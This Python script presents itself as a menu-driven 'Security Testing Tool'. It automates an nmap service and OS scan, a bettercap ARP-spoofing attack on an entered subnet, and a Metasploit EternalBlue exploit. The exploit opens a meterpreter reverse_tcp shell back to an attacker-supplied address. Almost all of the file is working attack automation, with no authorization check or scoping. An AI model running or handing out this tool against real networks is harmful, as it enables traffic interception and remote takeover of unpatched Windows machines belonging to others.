import subprocess
import nmap
import pexpect
import ipaddress

print("Starting Python script...")

def validate_ip(ip_str):
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def validate_network(network_str):
    try:
        ipaddress.ip_network(network_str)
        return True
    except ValueError:
        return False

def get_target_network():
    while True:
        network = input("Enter target network (e.g., 192.168.1.0/24): ")
        if validate_network(network):
            return network
        print("Invalid network format. Please try again.")

def get_target_ip():
    while True:
        ip = input("Enter target IP address: ")
        if validate_ip(ip):
            return ip
        print("Invalid IP address format. Please try again.")

def nmap_scan():
    try:
        target_network = get_target_network()
        print("Running nmap scan...")
        scanner = nmap.PortScanner()
        print(f"Nmap Scanning network {target_network}...")
        scanner.scan(target_network, arguments='-sV -O')
        hosts = scanner.all_hosts()
        
        if not hosts:
            print("No hosts found")
            return None
            
        for host in hosts:
            try:
                print(f"Host: {host}")
                print(f"State: {scanner[host].state()}")
                for proto in scanner[host].all_protocols():
                    print(f"Protocol: {proto}")
                    lport = scanner[host][proto].keys()
                    for port in lport:
                        print(f"Port: {port}\tService: {scanner[host][proto][port]['name']}")
            except KeyError as e:
                print(f"Error processing host {host}: {e}")
                
        return scanner
    except nmap.PortScannerError as e:
        print(f"Nmap scan failed: {e}")
        return None
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return None

def bettercap_attack():
    try:
        target_network = get_target_network()
        print("Running bettercap attack...")
        print(f"Starting bettercap ARP spoofing attack on {target_network}...")
        
        cmd = [
            'bettercap',
            '-eval',
            f'set arp.spoof.fullduplex true; set arp.spoof.targets {target_network}; arp.spoof on'
        ]
        
        subprocess.run(
            cmd,
            shell=False,
            check=True,
            capture_output=True,
            text=True
        )
        print("Attack completed.")
    except subprocess.CalledProcessError as e:
        print(f"Bettercap attack failed: {e}")
        print(f"Error output: {e.stderr}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def metasploit_exploit():
    try:
        target_ip = get_target_ip()
        print("Running metasploit exploit...")
        print(f"Launching metasploit console targeting {target_ip}...")
        child = pexpect.spawn("/usr/bin/msfconsole")
        
        child.expect("msf>", timeout=30)
        child.sendline("use exploit/windows/smb/ms17_010_eternalblue")
        child.expect("ms17_010_eternalblue")
        
        child.sendline(f"set RHOST {target_ip}")
        child.expect("RHOST =>")
        
        child.sendline("set PAYLOAD windows/x64/meterpreter/reverse_tcp")
        child.expect("PAYLOAD =>")
        
        # Get local host IP for reverse connection
        lhost = input("Enter your local IP for reverse connection: ")
        if validate_ip(lhost):
            child.sendline(f"set LHOST {lhost}")
            child.expect("LHOST =>")
        else:
            print("Invalid local IP address")
            return
        
        child.sendline("exploit")
        child.expect("Meterpreter session")
        print("Exploit successful! Meterpreter session opened.")
        
        child.interact()
    except pexpect.ExceptionPexpect as e:
        print(f"Metasploit exploit failed: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def main_menu():
    while True:
        print("\n=== Security Testing Tool ===")
        print("1. Run Nmap Scan")
        print("2. Run Bettercap Attack")
        print("3. Run Metasploit Exploit")
        print("4. Exit")
        
        choice = input("\nEnter your choice (1-4): ")
        
        if choice == '1':
            nmap_scan()
        elif choice == '2':
            bettercap_attack()
        elif choice == '3':
            metasploit_exploit()
        elif choice == '4':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main_menu()
1